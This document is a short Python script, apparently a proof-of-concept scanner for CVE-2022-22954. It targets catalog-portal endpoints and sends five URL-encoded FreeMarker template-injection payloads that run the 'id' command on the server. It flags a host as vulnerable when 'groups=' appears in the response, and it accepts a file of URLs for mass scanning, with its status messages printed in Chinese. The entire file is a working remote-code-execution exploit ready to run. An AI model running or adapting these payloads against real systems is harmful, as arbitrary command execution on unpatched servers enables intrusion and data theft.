import requests
from optparse import OptionParser

requests.packages.urllib3.disable_warnings()

headers = {
    'Accept-Encoding': 'gzip, deflate',
    'Accept': '*/*',
    'Accept-Language': 'en',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    'Content-Type': 'application/json'
}

def Poc(url):
    path = ['/catalog-portal/ui?code=&deviceUdid=&deviceType=%24%7B"freemarker.template.utility.Execute"%3Fnew%28%29%28"id"%29%7D',
            '/catalog-portal/hub-ui?deviceType=&deviceUdid=%24%7B"freemarker.template.utility.Execute"%3Fnew%28%29%28"id"%29%7D',
            '/catalog-portal/hub-ui/byob?deviceType=&deviceUdid=%24%7B"freemarker.template.utility.Execute"%3Fnew%28%29%28"id"%29%7D',
            '/catalog-portal/ui/oauth/verify?error=&deviceType=&deviceUdid=%24%7B"freemarker.template.utility.Execute"%3Fnew%28%29%28"id"%29%7D',
            '/catalog-portal/ui/oauth/verify?code=&deviceType=&deviceUdid=%24%7B"freemarker.template.utility.Execute"%3Fnew%28%29%28"id"%29%7D']
    url_gets = []
    try:
        for i in path:
            url_poc = url + i
            resp = requests.get(url_poc,headers = headers, verify=False,timeout=3).text
            if 'groups=' in str(resp):
                if url in url_gets:
                    pass
                else:
                    print("="*70)
                    print("[*]可能存在漏洞!!! URL为:" + url)
                    url_gets.append(url)
            else:
                print("=" * 70)
                print("[-]不存在漏洞")
    except:
        print("=" * 70)
        print("[-]连接超时")

if __name__ == '__main__' :
    parser = OptionParser(description="CVE-2022-22954_3Ss.py")
    parser.add_option('-u',type='string',dest='url',help='target url for example : https://www.qq.com')
    parser.add_option('-f', type='string', dest='file', help='scan urls , one url per line in file')
    options,args = parser.parse_args()
    if options.file:
        for i in open(options.file,'r'):
            Poc(i.strip())
    else:
        Poc(options.url)